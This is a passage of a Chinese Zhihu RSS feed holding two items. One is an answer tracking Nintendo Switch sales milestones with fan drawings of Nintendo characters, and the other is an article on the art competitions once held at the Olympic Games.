[{"title":"SWITCH销量会破亿吗？","date":"2021-08-05 11:30:08","description":"\n<p>不可能破亿的。</p>\n<p><br></p>\n<p>能过5000万就了不起了。</p>\n<p><br></p>\n<p>我觉得是过不了5000万这条线的，要是过了的话，每过100万我在这个回答里更新一个任天堂游戏人物的画像。</p>\n<hr>\n<p>愿赌服输。</p>\n<p><br></p>\n<p>5100万突破的马里奥</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e97c47a40b703e0f1619b32dfcd7a49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-7e97c47a40b703e0f1619b32dfcd7a49\" data-watermark-src=\"v2-5b759cb4c8462090ad284ec0dba96d8b\" data-private-watermark-src=\"v2-6ef7711f8a8da088164c62db56a4c2c0\"></p>\n<p>5200万突破的碧琪公主</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b4941391c25fa167c5f5269be2c3ad45_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-b4941391c25fa167c5f5269be2c3ad45\" data-watermark-src=\"v2-2443f779a45575d6ac0e0fa42ed4a63c\" data-private-watermark-src=\"v2-ee3ae8ac2527c26bb6466b79b892e4e6\"></p>\n<p>财报更新了，目前5577万。</p>\n<p>5300万突破的罗伊·阿夸·库巴</p>\n<p><img src=\"https://pic3.zhimg.com/v2-02cfe45c2d6a5ff805df3180039a6799_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-02cfe45c2d6a5ff805df3180039a6799\" data-watermark-src=\"v2-0cf443a06cedc28ef5e55e9bb3f1218b\" data-private-watermark-src=\"v2-5dee1b4238d232686bdb3e675f8b7b2a\" data-tags=\"politic\"></p>\n<p>5400万突破的初代林克</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1f9c595e2bc4f4e8ec212dbfc1847c31_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-1f9c595e2bc4f4e8ec212dbfc1847c31\" data-watermark-src=\"v2-17cb54ac8696d41ebfe4aed29ee6fe9b\" data-private-watermark-src=\"v2-2dc9b3cb474f37f192c3e56ebc690316\"></p>\n<p>5500万突破的小麦克</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e4a14e1f8a7019850a2e6074fcceefb9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-e4a14e1f8a7019850a2e6074fcceefb9\" data-watermark-src=\"v2-93d3c9cdbd6be2e7f438db7cd9b5a9d2\" data-private-watermark-src=\"v2-0d12380b8963c5ad3de55277cd57eb8b\"></p>\n<p> 任天堂新财报出炉，硬件销量累计6144万台。</p>\n<p>5600万突破的《打鸭子》里的狗。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-34800cf72d395278192a449fdab15fb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-34800cf72d395278192a449fdab15fb4\" data-watermark-src=\"v2-7d1c6cc6d39d2c640437781627e23906\" data-private-watermark-src=\"v2-350f7ba3a744abf92073941d56990587\"></p>\n<p>5700万突破的大库巴。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3480d71eab7a33d784c3ae5c7ccf73c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3480d71eab7a33d784c3ae5c7ccf73c2\" data-watermark-src=\"v2-43671d455892d4f7c17649c8f35c3ef6\" data-private-watermark-src=\"v2-fc50e92beba929d596921cbc51184ba3\"></p>\n<p>5800万突破的初代塞尔达公主。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b699e71ff18611272d87c9dab241f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-b699e71ff18611272d87c9dab241f365\" data-watermark-src=\"v2-5b4694e35ff429dab96642d2933fba0d\" data-private-watermark-src=\"v2-05ff01512c1c3b5fa32a4c48d6c27d19\"></p>\n<p>5900万突破的……“公主在另一个城堡”</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ac4d4dff3b84870f453a689bbcd12f2f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4d4dff3b84870f453a689bbcd12f2f\" data-watermark-src=\"v2-2a084da290cd5f0d9576cbe3877ab809\" data-private-watermark-src=\"v2-c7fffa18dc06036fbabd43e6e1339f15\" data-tags=\"politic\"></p>\n<p>6000万突破的DONKEY KONG X 凑阿夸</p>\n<p><img src=\"https://pic1.zhimg.com/v2-75d04349ee9d4784f55eadb4ab8eafca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-75d04349ee9d4784f55eadb4ab8eafca\" data-watermark-src=\"v2-47f2a86f52169155ba5bb33081fbfb44\" data-private-watermark-src=\"v2-189e7b375401321be63bc50717a90aec\"></p>\n<p>6100万突破的《MOTHER》初代主角：NINTEN</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f566941b5a0bacd5c09a8b69a1b4ca89_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f566941b5a0bacd5c09a8b69a1b4ca89\" data-watermark-src=\"v2-0f343fb74aa79ef9222140944ede4f86\" data-private-watermark-src=\"v2-ab8892c93527abbfe8c7161e69bea803\"></p>\n<p>任天堂新财报出炉，硬件销量累计6830万台。</p>\n<p>因为这次有人提醒所以提前几天就画了……到家后传上来吧。</p>\n<p>这次我猜得挺准的……</p>\n<p>6200万突破的卡比（卡比的造型是真好画啊……）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4803c93cc89ab7038c0e50efcabcf284_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4803c93cc89ab7038c0e50efcabcf284\" data-watermark-src=\"v2-05307b92cfd5cd1ec15163ac2fd10706\" data-private-watermark-src=\"v2-77bec68f4d48ddeb9e64d6b9889ee2ef\"></p>\n<p>6300万突破的马里奥系列经典家门怪酷栗宝。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3016f768a9d2caa844ad73888afb9bba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3016f768a9d2caa844ad73888afb9bba\" data-watermark-src=\"v2-4aaf71c3a15df5f274d1609204799d0e\" data-private-watermark-src=\"v2-aff026e2ef5922fc1b5dc340bb9eedcb\"></p>\n<p>6400万突破的塞尔达传说系列人气角色……汀格尔（不过气球装的来源是DS上的汀格尔气球大战）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f44b617999b0a5fd1955a4970bba2d4c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f44b617999b0a5fd1955a4970bba2d4c\" data-watermark-src=\"v2-9a88e892a4097e9b1b0ae448df9e88ea\" data-private-watermark-src=\"v2-f639da87b33cf41809fbf8148251ca7d\"></p>\n<p>6500万突破的火焰之纹章初代男主马尔斯。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4fc800703398b2206fc5b0f0b6832665_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4fc800703398b2206fc5b0f0b6832665\" data-watermark-src=\"v2-44fecc7621f294be30e695c0c455631b\" data-private-watermark-src=\"v2-9ee0629b4f51859c72a4007b95ab209f\"></p>\n<p>6600万突破的塞尔达传说风之杖的BOSS加农。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-eb9869674e2a8829c733e496254c98b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-eb9869674e2a8829c733e496254c98b0\" data-watermark-src=\"v2-f0a86545a27a07766da8008c3c48672f\" data-private-watermark-src=\"v2-e668ab9e0e768590bf17ecf7eff1b04b\"></p>\n<p>6700万突破的银河战士系列主角萨姆斯。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-81e3fe5406082c4c3eeb50a962907a8f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-81e3fe5406082c4c3eeb50a962907a8f\" data-watermark-src=\"v2-55eec70f197b516504dca4c76d2a9658\" data-private-watermark-src=\"v2-3e2f1cc0417f0ead4bfc87a202140399\"></p>\n<p>6800万突破的马里奥系列老二哥路易。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c867c6fd6d65b4cbfe181a31cf1d2e68_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-c867c6fd6d65b4cbfe181a31cf1d2e68\" data-watermark-src=\"v2-cb561b7ec9113cbbcecc0f9b22a08f62\" data-private-watermark-src=\"v2-c9a298d2a93c72d3c6f135c4051d26f6\"></p>\n<p>任天堂新财报出炉，硬件销量累计7987万台。</p>\n<p>虽然提前画了些但少估了200万，到家后快点画完补上两张……</p>\n<p>6900万突破的马里奥系列经典怪德哥（其实叫锤子兄弟……）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8b2f990ffec63361f15bd33026411289_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8b2f990ffec63361f15bd33026411289\" data-watermark-src=\"v2-e52ac808c5436d3e2f3de80d209f0b64\" data-private-watermark-src=\"v2-65bbca677355c656e282506641a2a306\"></p>\n<p>7000万突破的老娘经典怪星人</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0d1c6548698743b1ef4c4287603c64cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-0d1c6548698743b1ef4c4287603c64cd\" data-watermark-src=\"v2-cd1a2522295b09ea4464f0e3300577cb\" data-private-watermark-src=\"v2-ad4dbba6397b9f6335b3a183fd8fb99e\"></p>\n<p>7100万突破的纸马折纸王国的炸弹彬</p>\n<p><img src=\"https://pic2.zhimg.com/v2-226f2adb536326398924c042bbb75602_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-226f2adb536326398924c042bbb75602\" data-watermark-src=\"v2-b391eeeab09d63f2b6f4e06e0a34e4f0\" data-private-watermark-src=\"v2-4a5afc5a0f16cfea629c8010b4d2ec9c\"></p>\n<p>7200万突破的F-ZERO猎鹰队长</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac4847300494463862f509f3cbf9c5d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4847300494463862f509f3cbf9c5d2\" data-watermark-src=\"v2-adbd433b35e540fb347ba458cb07c75b\" data-private-watermark-src=\"v2-2814d104d864e374c1980d59d9f5b5c9\"></p>\n<p>7300万突破的口袋妖怪经典PM鲤鱼王</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1e278a6a9f60a043bbbb7857a927edf3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-1e278a6a9f60a043bbbb7857a927edf3\" data-watermark-src=\"v2-11f2f41b0bb6487694ac3475f889fa7d\" data-private-watermark-src=\"v2-2504c7a60907cfb9a886c05a7288404f\"></p>\n<p>7400万突破的魔法假日女主角</p>\n<p><img src=\"https://pic3.zhimg.com/v2-575443f7856df5a41c3126730b52102a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-575443f7856df5a41c3126730b52102a\" data-watermark-src=\"v2-b351c118ae00d047f9ca4c16084d86eb\" data-private-watermark-src=\"v2-d814264ddea00c0c4b3768e5b7fa97b0\"></p>\n<p>7500万突破的塞尔达时之笛傲娇佐拉小公主露塔</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d7f34f8247ff89807684c4a587bc6eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-d7f34f8247ff89807684c4a587bc6eb4\" data-watermark-src=\"v2-45c1ebafe29ac4a705d870b80416d8a2\" data-private-watermark-src=\"v2-9eccac143414d4a8978d64b1ec8072cd\"></p>\n<p>7600万突破的口袋妖怪PM 巨钳螳螂</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb76ae1344f27a277a0dc219d1c0e323_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-fb76ae1344f27a277a0dc219d1c0e323\" data-watermark-src=\"v2-e88360ee0d8a0fea1e9700e2182d02d6\" data-private-watermark-src=\"v2-8a380a6430863c1ffee7c6134ca33836\"></p>\n<p>7700万突破的动物之森恶毒资本家狸克</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3a0becf83c4f72e574f361e50e78b34d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3a0becf83c4f72e574f361e50e78b34d\" data-watermark-src=\"v2-edf5e367e272d180696c5ba4ab650bf3\" data-private-watermark-src=\"v2-78ace80e99951ca815f1d7e9be2b3a9f\"></p>\n<p>7800万突破的皮克敏主角奥利马</p>\n<p><img src=\"https://pic3.zhimg.com/v2-71e28f8a0385653c4bd5fe662b7a2930_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-71e28f8a0385653c4bd5fe662b7a2930\" data-watermark-src=\"v2-5c39930229a2fb2f84ab0fb6dc42d29f\" data-private-watermark-src=\"v2-0b4139cb2baa1a72f4b89535bcba2237\"></p>\n<p>7900万突破的黄金太阳米雅莉</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4127f601aab0aa6a957275417cb2484a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4127f601aab0aa6a957275417cb2484a\" data-watermark-src=\"v2-4ae487bb7391aea965d9fe40e010dd06\" data-private-watermark-src=\"v2-dc881b0ee2444af0c2fa03a2d344868d\"></p>\n<p>……躺着也赚爆，ND还会开吗。</p>\n<p> 任天堂财报出炉，截止2021年3月31日：NS硬件销量累计8459万台。</p>\n<p>最近痛风（不是MHR）中只能保持着一个难受的姿势画图，没什么耐心就偷了一些工……</p>\n<p>8000万突破的马里奥系列的黛西公主。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2b1107350eb990c83225ee4f616e0202_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-2b1107350eb990c83225ee4f616e0202\" data-watermark-src=\"v2-a0486a36b1dccaf4efc199ec31f65d1e\" data-private-watermark-src=\"v2-90bcb7669e244cbaa419957b98de4186\"></p>\n<p>8100万突破的健身环BOSS堕拉贡，顺便庆贺健身环突破1000万销量。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dc89fc783f84f45405a049b65593e926_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1100\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-dc89fc783f84f45405a049b65593e926\" data-watermark-src=\"v2-4a6d9eba1d4fdd222091e0d684483737\" data-private-watermark-src=\"v2-d03dbb1f838f5d4448284212ffed6c27\"></p>\n<p>8200万突破的口袋妖怪大朝北鼻</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f71f639f10888c3781d5d938aee51718_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f71f639f10888c3781d5d938aee51718\" data-watermark-src=\"v2-6170a25880e687ef62a8ada01da4a324\" data-private-watermark-src=\"v2-37ba9ea174ce13053c19a3c1bbc33922\"></p>\n<p>8300万突破的迪迪刚</p>\n<p><img src=\"https://pic4.zhimg.com/v2-48a68a8f1a13c99de91f55b962c6616b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-48a68a8f1a13c99de91f55b962c6616b\" data-watermark-src=\"v2-eb1e481256fcfb6ff74d1c139b30783d\" data-private-watermark-src=\"v2-946769d6fbfc45f44a13872cb77d3687\"></p>\n<p>8400万突破的火纹初代女主希达</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f1d6481f538b2d400c7d1d4fbe65980e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f1d6481f538b2d400c7d1d4fbe65980e\" data-watermark-src=\"v2-8a542c9eb9fd526432313aa4313599a8\" data-private-watermark-src=\"v2-35da410d847903c36d70c7c03bdac238\"></p>\n<p>该忏悔了……</p>\n<p>任天堂财报出炉，截止2021年6月30日：NS硬件销量累计8904万台。</p>\n<p>这次有之前多画的凑数，倒是省事……</p>\n<p>8500万突破的零装萨姐</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5f2b2f55f11a627558080182c5ef7eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-5f2b2f55f11a627558080182c5ef7eb4\" data-watermark-src=\"v2-9ce5618b77239810a63041682f53d18b\" data-private-watermark-src=\"v2-bc6166d27a756bb07139b9865dfd83d5\"></p>\n<p>8600万突破的马里奥系列炮弹刺客</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8e716ed1ecb8ea2439acc0a39ccfdf3b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8e716ed1ecb8ea2439acc0a39ccfdf3b\" data-watermark-src=\"v2-f6745518de669ccc4d63fa490499c0d1\" data-private-watermark-src=\"v2-869e94fce98da02f7b0eb847accf3121\"></p>\n<p>8700万突破的金属之光主角老妹日向梓</p>\n<p><img src=\"https://pic2.zhimg.com/v2-55557db03287da3fdde7cfe83a21ee4d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-55557db03287da3fdde7cfe83a21ee4d\" data-watermark-src=\"v2-f2ba8b2c7b7c006c73c963d9cae0b286\" data-private-watermark-src=\"v2-1c8738f450b05cb665b410f86de18304\"></p>\n<p>8800万突破的赫拉克罗斯</p>\n<p><img src=\"https://pic2.zhimg.com/v2-433f189074bc85d487d260c8b2c3a9de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-433f189074bc85d487d260c8b2c3a9de\" data-watermark-src=\"v2-c21118e69d7de503ef0128763e490da7\" data-private-watermark-src=\"v2-958bbdc57fff20166edfd779cec3417c\"></p>\n<p>8900万突破的面具商人（这个角色真是塞尔达系列里最让我感觉渗人的……某种意义上的童年阴影）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cbf965782065bc781bc2f655b2a95ab7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-cbf965782065bc781bc2f655b2a95ab7\" data-watermark-src=\"v2-0d5a9b7de29293b5e3807e3741a9bbf8\" data-private-watermark-src=\"v2-d83c9587d4b538306efb20b796130bc3\"></p>\n<p>这次硬件销量同比缩水，爆杀古川，该来点大的了吧！（但其实是去年动森太猛了，恐怕古川还要继续躺……）</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\">匿名用户</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">179 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/297478327?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价switch2019年推出的升级版？</a><br><a href=\"http://www.zhihu.com/question/286061729?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">年龄大了玩 Switch 什么感受？</a><br>\n","link":"http://www.zhihu.com/question/266492999/answer/309613424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如果艺术家也能角逐奥运金牌……","date":"2021-08-05 09:34:13","description":"\n<p>1908年奥运会，沃尔特·威南斯代表美国队出赛，赢得了射击项目金牌。他在1912年又一次参加奥运会，并且除射击之外，还参加了另一个项目，并赢得金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_b.jpg\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1532\" class=\"origin_image zh-lightbox-thumb\" width=\"2048\" data-original=\"https://pic1.zhimg.com/v2-4bd68a2985b71c5478c830a107ea4d9c_r.jpg\"><figcaption>沃尔特·威南斯</figcaption></figure><p>问：沃尔特·威南斯参加的是什么项目？</p>\n<ul>\n<li>A，马术</li>\n<li>B，游泳</li>\n<li>C，唱歌</li>\n<li>D，雕塑</li>\n</ul>\n<p>要是按照以往做选择题的经验，我们肯定先排除两个明显和题干奥运会无关的选项唱歌和雕塑，然后再考虑，射击、游泳和马术都包含在现代五项里面，不太好选，但看照片这位老人家颇有一幅西部片里面警长的样子，肯定会骑马，不一定会游泳，所以答案应该是A，马术？</p>\n<p>很遗憾，答案是D。他的金牌的确和马有关，但并不是马术，而是……一件青铜雕塑——《美国快步马》。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_b.jpg\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"1920\" data-original=\"https://pic2.zhimg.com/v2-6e44049c1415a841c8b07be4c6f9e3b5_r.jpg\"><figcaption>沃尔特·威南斯，《美国快步马》</figcaption></figure><p>是的，当年的奥运会，曾经是比雕塑的。而且不光有雕塑，还有绘画、建筑、音乐和文学，一比就是几十年。</p>\n<p>在奥运会搞艺术大奖赛这事儿确实不是瞎折腾，而是现代奥林匹克运动会的创始人皮埃尔·德·顾拜旦的主意。早在1894年头一回奥运会之后，顾拜旦就觉得不过瘾，不够劲儿。他觉得世界大同光靠体育的交流还是不够，还需要有心灵的交流，心灵交流就要靠艺术。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"965\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic3.zhimg.com/v2-f129afa6e23db35f40989472ba6491e6_r.jpg\"><figcaption>顾拜旦男爵皮埃尔·德·弗雷迪</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_b.jpg\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"767\" class=\"origin_image zh-lightbox-thumb\" width=\"684\" data-original=\"https://pic2.zhimg.com/v2-2af535af5806ccb2a9015d0416781315_r.jpg\"><figcaption>顾拜旦的《奥林匹克宣言》手稿于2019年经苏富比拍卖，以6160万元成交。</figcaption></figure><p>于是，当1912年斯德哥尔摩承办奥运会的时候，顾拜旦就说，咱那些体育项目：田径、体操、帆船、马术……照常比，再加几条艺术的呗。斯德哥尔摩一开始是很不情愿的，但是最终还是同意增设绘画、雕塑、建筑、音乐、文学五个领域，各设金银铜牌。舞蹈、电影和摄影等形式一度也被纳入考量范围，但最终没有被采纳。参赛作品的体裁不限，但有一个要求——必须呼应体育运动主题和奥林匹克精神。</p>\n<p>这就有了前面咱们说的双料冠军沃尔特·威南斯，一个人赢下射击和雕塑两项金牌的逸事了。不过，老实说咱们这位奥运金牌得主并不是特别有名的艺术家，他的雕塑作品也是中规中矩。之所以他赢得金牌，其实也是矮子里面拔高个，第一届有艺术赛事的奥运会，五个项目加起来，才总共只有35人报名参加，按最终颁发15枚奖牌计算，等于每两个半人就能匀到一枚奖牌，竞争激烈程度比跑步、跳高可是低多了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1082\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic2.zhimg.com/v2-469b0713b53bb1afcd9a2eb475b54325_r.jpg\"><figcaption>1912年斯德哥尔摩奥运会海报，图画作者为奥洛夫·霍茲伯格，他的这幅画并没有参赛获奖</figcaption></figure><p>虽说一开始艺术赛事的热度不高，但顾拜旦并不打算就此打住。在接下来的几十年里，艺术赛事的参与度逐年增高，到1924年的时候，已经有193位各界艺术家参赛了，而竞赛项目也开始细分，绘画分出了油画、水彩素描、版画；建筑奖项分成两项：建筑和城市规划。只不过这两个类别有时候实在很难区分，有时候干脆会把这两个奖颁给同一个建筑作品。</p>\n<p>文学分出了戏剧、史诗和诗歌——这项赛事的参赛者必须使用英语或者法语参赛。有意思的是，咱们的顾拜旦爵爷为了炒高比赛热度，还曾使用化名乔治·欧罗德和马丁·艾芬巴赫参加诗歌项目赛事，最后乔治·欧罗德还真的赢了一枚金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a6a828dfff444c76015fdc9e646560bc_b.jpg\" data-size=\"normal\" data-rawwidth=\"320\" data-rawheight=\"320\" class=\"content_image\" width=\"320\"><figcaption>1924年巴黎奥运会金牌，可以看到左下角包含有竖琴等和艺术有关的元素</figcaption></figure><p>音乐赛事虽然分出了管弦乐、独奏和人声，但其实这些作品都是以乐谱的形式递交给组委会的，并不是像今天的选秀节目那样由乐手现场表演给评委。尽管评委们并非等闲之辈——音乐赛事评委中包括有伊戈尔·斯特拉文斯基这样的乐坛传奇，文学评委包括诺贝尔文学奖得主塞尔玛·拉格洛夫等，但在面对这「一页页」奥运选手时，评委们难免因艺术主张的分歧而难以达成共识。事实上，斯特拉文斯基担任音乐赛事评委的1924年奥运会根本没有颁发任何音乐奖牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"967\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic1.zhimg.com/v2-f02397d5e205aebfd5dc3af966ec2294_r.jpg\"><figcaption>斯特拉文斯基的作品如《火鸟》、《春之祭》至今仍会在奥运会花样滑冰等赛事的配乐中出现</figcaption></figure><p>当然，颁不出奖一个原因可能是评委的标准高，另一个原因也是因为很多名声在外的艺术大师不太愿意参赛。这一时期咱们能叫得出名字的那些艺术家，比如毕加索、马蒂斯……全都没参加奥运会。一些艺术家不愿意和其他自己看不上的艺术家同台竞技，另有些艺术家不太愿意迎合奥运会的套路去命题作文——很多参加绘画赛事的艺术家为了能够吸引评委的眼球，都会选择绘制紧张刺激的拳击、橄榄球等主题作品。历史上唯一一位两届奥运会绘画金牌得主让·雅可比的得奖作品便是描绘足球运动中前锋和守门员争球的《角球》和橄榄球运动员激烈拼抢的《橄榄球》。它们为他分别赢得了一枚综合绘画金牌和素描金牌。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_b.jpg\" data-size=\"normal\" data-rawwidth=\"448\" data-rawheight=\"700\" class=\"origin_image zh-lightbox-thumb\" width=\"448\" 